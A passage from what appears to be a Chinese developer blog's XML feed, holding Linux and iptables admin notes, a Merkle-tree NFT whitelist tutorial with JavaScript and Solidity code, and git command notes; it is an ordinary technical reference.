class="hljs-number">0</span>] + <span class="hljs-string">&#x27;(&#x27;</span> + result[<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;years old)&#x27;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      </span><br><span class="language-javascript">        </span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>区块链应用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux操作小结</title>
    <link href="/2022/09/06/Centos%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0(%E5%AE%9D%E5%A1%94)/"/>
    <url>/2022/09/06/Centos%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0(%E5%AE%9D%E5%A1%94)/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /etc/init.d/bt default <span class="hljs-comment">#获取服务器默认密码</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ isof -i:80 <span class="hljs-comment"># 查看80端口下的进程</span><br></code></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol><li>ctrl + L 清屏</li><li>pwd 查看当前路径</li><li>touch 创建文件</li><li>mkdir 创建文件夹</li><li>rm 删除文件或目录</li><li>rm -rf 强制删除并且无法恢复（慎用）</li><li>wc 统计并且输出文件的行数单词数和字节数</li><li>打包与压缩：tar -zcvf xxx.tar</li><li>解包与解压：tar -zxvf xxx.tar</li></ol><h2 id="vim操作"><a href="#vim操作" class="headerlink" title="vim操作"></a>vim操作</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">不编辑内容直接退出，在命令模式下输入</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">:q</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">编辑内容不保存直接退出，在命令模式下输入</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">:q!</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">编辑内容后保存退出，在命令模式下输入</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">:wq</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">将光标定在文件第一行</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">gg</span><br></code></pre></td></tr></table></figure><h2 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h2><blockquote><p>新开一个任务终端，用于后台运行！</p></blockquote><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yum -y install screen</span><br></code></pre></td></tr></table></figure><h3 id="创建一个叫demo的screen任务"><a href="#创建一个叫demo的screen任务" class="headerlink" title="创建一个叫demo的screen任务"></a>创建一个叫demo的screen任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">screen -S demo</span><br></code></pre></td></tr></table></figure><h3 id="查看screen任务"><a href="#查看screen任务" class="headerlink" title="查看screen任务"></a>查看screen任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">screen -<span class="hljs-built_in">ls</span></span><br></code></pre></td></tr></table></figure><h3 id="将screen任务放到后台"><a href="#将screen任务放到后台" class="headerlink" title="将screen任务放到后台"></a>将screen任务放到后台</h3><p>快捷键 <code>ctrl</code>+<code>a</code>+<code>d</code></p><h3 id="进入screen任务"><a href="#进入screen任务" class="headerlink" title="进入screen任务"></a>进入screen任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">screen -r &#123;pid&#125;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">或者</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">screen -r &#123;task_name&#125;</span><br></code></pre></td></tr></table></figure><h3 id="删除screen任务"><a href="#删除screen任务" class="headerlink" title="删除screen任务"></a>删除screen任务</h3><p>使用 <code>-r</code> 进入screen任务之后 输入  <code>exit</code></p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">/etc/init.d/iptables stop <span class="hljs-comment">#关闭防火墙</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">iptables -nL  <span class="hljs-comment">#查看iptables详细策略信息</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">iptables -A INPUT -p tcp --dport 8080 -j ACCEPT <span class="hljs-comment">#放通入方向的8080端口</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">iptables -A OUTPUT -p tcp --dport 8080 -j ACCEPT <span class="hljs-comment">#放通出方向的8080端口</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">iptables  -F： <span class="hljs-comment">#清除所有制订的规则</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>服务器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Merkle树——验证NFT白名单</title>
    <link href="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/"/>
    <url>/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/</url>
    
    <content type="html"><![CDATA[<blockquote><p>在我们今天所知道和喜爱的区块链出现之前，默克尔树一直是密码学和计算机科学领域的一个方面。如今，我们开始慢慢看到它们在链上更频繁地<u>被用于数据验证</u>的目的。</p></blockquote><h2 id="1-什么是默克尔树？"><a href="#1-什么是默克尔树？" class="headerlink" title="1. 什么是默克尔树？"></a>1. 什么是默克尔树？</h2><p>默克尔树是一种树状结构，树上的每个节点都由一个值表示，这个值是一些加密哈希函数的结果。哈希函数是单向的，<mark>从一个输入产生一个输出很容易</mark>，<mark>但从一个输出确定一个输入在计算上是不可行的</mark>。默克尔树有3种类型的节点，如下所示：</p><ol><li><strong>叶子节点</strong> - 叶子节点位于树的最底部，它们的值是<strong>原始数据</strong>的哈希值。一棵树上有多少个叶子节点，就有多少个需要哈希的原始数据。例如，如果有7个数据需要被哈希，就会有7个叶子节点。</li><li><strong>父节点</strong> - 父节点可以位于树的不同层次，这取决于整个树的大小，父节点总是位于叶节点之上。父节点的值是由它下面的节点的哈希值决定的，通常从左到右开始。由于不同的输入总是会产生不同的哈希值，不考虑哈希值的碰撞，<mark>节点哈希值的连接顺序很重要</mark>。</li><li><strong>根节点</strong> - 根节点位于树的顶端，由位于它下面的两个父节点的哈希值连接而成，同样从左到右开始。任何默克尔树上都只有一个根节点，根节点拥有根哈希值。</li></ol><h2 id="2-默克尔树结构"><a href="#2-默克尔树结构" class="headerlink" title="2. 默克尔树结构"></a>2. 默克尔树结构</h2><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/1.webp"></p><h3 id="简化它"><a href="#简化它" class="headerlink" title="简化它"></a>简化它</h3><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/2.png"></p><h2 id="3-为什么需要默克尔树？"><a href="#3-为什么需要默克尔树？" class="headerlink" title="3. 为什么需要默克尔树？"></a>3. 为什么需要默克尔树？</h2><h3 id="3-1-背景"><a href="#3-1-背景" class="headerlink" title="3.1 背景"></a>3.1 背景</h3><p>在NFT（ERC-721）的背景下使用Merkle树，白名单为选定的参与者群体保留一定数量的代币。</p><p>白名单地址将会预先计算成Merkle对象。</p><p>在这种情况下，可以让一个叶子节点代表我们白名单中的一个钱包地址的哈希值。</p><h3 id="3-2-痛点"><a href="#3-2-痛点" class="headerlink" title="3.2 痛点"></a>3.2 痛点</h3><p>前面提到过哈希函数是单向的——<mark>从一个输入产生一个输出很容易</mark>，<mark>但从一个输出确定一个输入在计算上是不可行的</mark>，并且连接顺序也将决定结果。</p><p><strong>Example</strong>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">hash（hash1,hash2） != <span class="hljs-title function_">hash</span>(hash2,hash1)<br></code></pre></td></tr></table></figure><p>在NFT白名单实例中，将会使用哈希值进行数据安全验证。</p><p>因此在这种情况下，直系验证是非常困难的，需要非常大的计算量和资源。</p><h3 id="传统验证"><a href="#传统验证" class="headerlink" title="传统验证"></a>传统验证</h3><blockquote><p>验证根哈希值是否相同，这看似很简单，但问题就在于，当你去验证一个地址时，到底将该地址哈希与哪个叶子哈希值进行替换并验证？这是很难计算得知的。</p></blockquote><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/3.png"></p><p><strong>根哈希验证的另一个难点（了解即可）</strong></p><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/4.png"></p><h3 id="3-3-如何解决——取得默克尔证明"><a href="#3-3-如何解决——取得默克尔证明" class="headerlink" title="3.3 如何解决——取得默克尔证明"></a>3.3 如何解决——取得默克尔证明</h3><p>Merkle树妙处在于它<strong>根本不需要与根哈希</strong>，<strong>父哈希等等进行等量校对</strong>。</p><p>如果试图验证一个叶子节点属于我们的树，<mark>只需要知道直接相邻的叶子节点哈希值</mark>(如果有的话)，<mark>以及叶子节点正上方相邻的父节点哈希值</mark>就可以了。</p><p>如果这个Merkle树有四层，五层甚至一百层，那么返回的哈希值数量将会相应增长！</p><h2 id="4-实战"><a href="#4-实战" class="headerlink" title="4. 实战"></a>4. 实战</h2><blockquote><p>实战将会带你实例化默克尔树对象以及取得默克尔树验证！</p></blockquote><h3 id="4-1-JavaScript实现"><a href="#4-1-JavaScript实现" class="headerlink" title="4.1 JavaScript实现"></a>4.1 JavaScript实现</h3><p><strong>安装</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm i -D merkletreejs keccak256<br></code></pre></td></tr></table></figure><p><mark><code>merkletree.js</code></mark></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123;<span class="hljs-title class_">MerkleTree</span>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;merkletreejs&#x27;</span>)<br><br><span class="hljs-keyword">const</span> keccak256 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;keccak256&#x27;</span>)<br><br><br><span class="hljs-keyword">let</span> whitelistAddresses = [<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2815&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2816&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2817&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2818&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2819&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2820&quot;</span>,<br>    <span class="hljs-string">&quot;0x262bCDeEf90181676BDC0a247A1954666F8a2821&quot;</span>       <br>]<br><br><span class="hljs-comment">//buffer化叶子结点</span><br><span class="hljs-keyword">const</span> leafNodes = whitelistAddresses.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">addr</span> =&gt;</span> <span class="hljs-title function_">keccak256</span>(addr))<br><br><span class="hljs-comment">//实例化默克尔树</span><br><span class="hljs-keyword">const</span> merkleTree = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MerkleTree</span>(leafNodes,keccak256,&#123;<span class="hljs-attr">sortPairs</span>:<span class="hljs-literal">true</span>&#125;);<br><br><span class="hljs-comment">//获取根哈希值</span><br><span class="hljs-keyword">const</span> rootHash = merkleTree.<span class="hljs-title function_">getRoot</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Whitelist Merkle Tree\n&#x27;</span>,merkleTree.<span class="hljs-title function_">toString</span>())<br><br><span class="hljs-comment">//定义你所需要验证的地址</span><br><span class="hljs-keyword">const</span> claimingAddress = leafNodes[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment">//取得默克尔树证明</span><br><span class="hljs-keyword">const</span> hexProof = merkleTree.<span class="hljs-title function_">getHexProof</span>(claimingAddress)<br><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Merkle Proof for Address is\n`</span>,hexProof)<br><br><br><span class="hljs-comment">//当你传入一个错误的白名单地址时</span><br><span class="hljs-keyword">const</span> errAddress = <span class="hljs-title function_">keccak256</span>(<span class="hljs-string">&#x27;0x98D9897e0F0389158978B384E6ecF3cf93153876&#x27;</span>);<br><br><span class="hljs-comment">//取得默克尔证明</span><br><span class="hljs-keyword">const</span> hexProof1 = merkleTree.<span class="hljs-title function_">getHexProof</span>(errAddress)<br><br><span class="hljs-comment">//将会得到空数组！</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Merkle Proof for error Address is\n`</span>,hexProof1)<br></code></pre></td></tr></table></figure><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p><img src="/2022/09/02/Merkle%E6%A0%91%E2%80%94%E2%80%94%E9%AA%8C%E8%AF%81NFT%E7%99%BD%E5%90%8D%E5%8D%95/5.png"></p><blockquote><p> 由于该默克尔树是由七个叶子节点组成的，所以这是一个三层结构的树，因此默克尔证明将会取得三个哈希值作为凭证。当树结构为五层，六层… 默克尔证明的哈希值数量会对应增加！</p></blockquote><h3 id="4-2-智能合约实现"><a href="#4-2-智能合约实现" class="headerlink" title="4.2 智能合约实现"></a>4.2 智能合约实现</h3><p><code>Merkletree.sol</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: SEE LICENSE IN LICENSE<br>pragma solidity ^0.8.0;<br><br><br>//导入默克尔树智能合约<br>import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/MerkleProof.sol&quot;;<br><br>contract Merkletree&#123;<br><br>    //该根哈希值需要你用到刚刚js生成的merkle树的根哈希（记得加上0x）<br>    bytes32 public merkleRoot = 0x3a6036ef5f6da50ea7f3dc72c7c83c1e6d5be6cded8ad495fb4b0bb870f1c093;<br>    <br>    //记录白名单是否被使用过<br>    mapping(address =&gt; bool) public whitelistClaimed;<br><br>    //使用白名单函数<br>    function whitelistMint(bytes32[] calldata _merkleProof) public&#123;<br>        //要求白名单没有被使用过<br>        require(!whitelistClaimed[msg.sender],&quot;Address has already claimed&quot;);<br>        //初始化叶子哈希<br>        bytes32 leaf = keccak256(abi.encodePacked(msg.sender));<br>        //将叶子哈希传入merkle树验证，查看是否是白名单<br>        require(MerkleProof.verify(_merkleProof, merkleRoot , leaf),&quot;Invalid proof&quot;);<br>        //是白名单，记录该白名单使用过<br>        whitelistClaimed[msg.sender] = true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>Merkle树是区块链中非常重要的数据结构，它的应用极大地减小了哈希安全验证的难度，提高了合约安全程度，减少了被攻击成功的可能性。</p><p>感谢阅读！</p><blockquote><p>Blog by Science_jun</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
      <category>区块链数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Merkle树</tag>
      
      <tag>数据验证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git-bash操作简记</title>
    <link href="/2022/09/01/Git%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/"/>
    <url>/2022/09/01/Git%E6%93%8D%E4%BD%9C%E7%AE%80%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="ssh配置"><a href="#ssh配置" class="headerlink" title="ssh配置"></a>ssh配置</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">使用以下命令生成 SSH Key</span><br>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看生成的密钥</span><br>cat ~/.ssh/id_rsa.pub<br><span class="hljs-meta prompt_">#</span><span class="language-bash">验证是否成功</span><br>ssh -T git@github.com<br></code></pre></td></tr></table></figure><h2 id="1-git-add"><a href="#1-git-add" class="headerlink" title="1. git add"></a>1. git add</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">清除暂存区缓存</span><br>git rm -r --cached .<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加一个或多个文件到暂存区</span><br>git add [file1] [file2] ...<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加指定目录到暂存区</span><br>git add [dir]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加当前目录下的所有文件到暂存区</span><br>git add .<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加当前项目文件到暂存区</span><br>git add -A<br></code></pre></td></tr></table></figure><h2 id="2-git-status"><a href="#2-git-status" class="headerlink" title="2. git status"></a>2. git status</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git status 命令用于查看在你上次提交之后是否有对文件进行再次修改</span><br>git status<br><span class="hljs-meta prompt_">#</span><span class="language-bash">使用 -s 参数来获得简短的输出结果</span><br>git status -s<br></code></pre></td></tr></table></figure><h2 id="3-git-diff"><a href="#3-git-diff" class="headerlink" title="3. git diff"></a>3. git diff</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git diff 命令比较文件的不同，即比较文件在暂存区和工作区的差异。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">git diff 命令显示已写入暂存区和已经被修改但尚未写入暂存区文件的区别。</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">尚未缓存的改动</span><br>git diff [file]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看已缓存的改动</span><br>git diff --cached [file]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看已缓存的与未缓存的所有改动</span><br>git diff HEAD<br><span class="hljs-meta prompt_">#</span><span class="language-bash">显示摘要而非整个diff</span><br>git diff --stat<br></code></pre></td></tr></table></figure><h2 id="4-git-commit"><a href="#4-git-commit" class="headerlink" title="4. git commit"></a>4. git commit</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git commit 命令将暂存区内容添加到本地仓库中。</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">提交暂存区到本地仓库中,附加备注信息</span><br>git commit -m [message]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">不需要执行 git add 命令，直接来提交</span><br>git commit -a<br></code></pre></td></tr></table></figure><h2 id="5-设置提交代码时的用户信息"><a href="#5-设置提交代码时的用户信息" class="headerlink" title="5. 设置提交代码时的用户信息"></a>5. 设置提交代码时的用户信息</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global user.name [name]<br>git config --global user.email [email]<br></code></pre></td></tr></table></figure><h2 id="6-git-reset"><a href="#6-git-reset" class="headerlink" title="6. git reset"></a>6. git reset</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git reset 命令用于回退版本，可以指定退回某一次提交的版本。</span><br>git reset [--soft | --mixed | --hard] [HEAD]<br></code></pre></td></tr></table></figure><h2 id="7-git-rm"><a href="#7-git-rm" class="headerlink" title="7. git rm"></a>7. git rm</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">将文件从暂存区和工作区中删除</span><br>git rm &lt;file&gt;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">强行从暂存区和工作区中删除修改后的 runoob.txt 文件：</span><br>git rm -f runoob.txt <br><span class="hljs-meta prompt_">#</span><span class="language-bash">把文件从暂存区域移除，但仍然希望保留在当前工作目录中，换句话说，仅是从跟踪清单中删除，使用 --cached 选项即可</span><br>git rm --cached &lt;file&gt;<br></code></pre></td></tr></table></figure><h2 id="8-git-mv"><a href="#8-git-mv" class="headerlink" title="8. git mv"></a>8. git mv</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git <span class="hljs-built_in">mv</span> 命令用于移动或重命名一个文件、目录或软连接</span><br>git mv [file] [newfile]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">如果新文件名已经存在，但还是要重命名它，可以使用 -f 参数</span><br>git mv -f [file] [newfile]<br></code></pre></td></tr></table></figure><h2 id="9-git-log-查看历史提交记录"><a href="#9-git-log-查看历史提交记录" class="headerlink" title="9. git log - 查看历史提交记录"></a>9. <strong>git log</strong> - 查看历史提交记录</h2><h2 id="10-git-remote"><a href="#10-git-remote" class="headerlink" title="10. git remote"></a>10. git remote</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">显示所有远程仓库</span><br>git remote -v<br><span class="hljs-meta prompt_">#</span><span class="language-bash">添加远程版本库</span><br>git remote add [给他取名] [url]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">例子：提交到 Github</span><br>git remote add origin git@github.com:tianqixin/runoob-git-test.git<br>git push -u origin<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除远程仓库</span><br>git remote rm name  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">修改仓库名</span><br>git remote rename old_name new_name <br></code></pre></td></tr></table></figure><h2 id="11-git-fetch"><a href="#11-git-fetch" class="headerlink" title="11. git fetch"></a>11. git fetch</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">以上命令将服务器上的任何更新（假设有人这时候推送到服务器了）合并到你的当前分支。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">然后我们在本地更新修改</span><br>git fetch origin<br><span class="hljs-meta prompt_">#</span><span class="language-bash">以上信息<span class="hljs-string">&quot;0205aab..febd8ed main -&gt; origin/main&quot;</span> 说明 main 分支已被更新，我们可以使用以下命令将更新同步到本地：</span><br>git merge origin/main<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看 README.md 文件内容：</span><br>cat README.md <br></code></pre></td></tr></table></figure><h2 id="12-git-pull"><a href="#12-git-pull" class="headerlink" title="12. git pull"></a>12. git pull</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">git pull 命令用于从远程获取代码并合并本地的版本。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">git pull 其实就是 git fetch 和git merge FETCH_HEAD的简写</span><br><br>git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">例子</span><br>git pull origin main<br></code></pre></td></tr></table></figure><h2 id="13-git-push"><a href="#13-git-push" class="headerlink" title="13. git push"></a>13. git push</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除主机的分支可以使用 --delete 参数，以下命令表示删除origin主机的master分支</span><br>git push origin --delete master<br><span class="hljs-meta prompt_">#</span><span class="language-bash">如果本地版本与远程版本有差异，但又要强制推送可以使用 --force 参数</span><br>git push --force 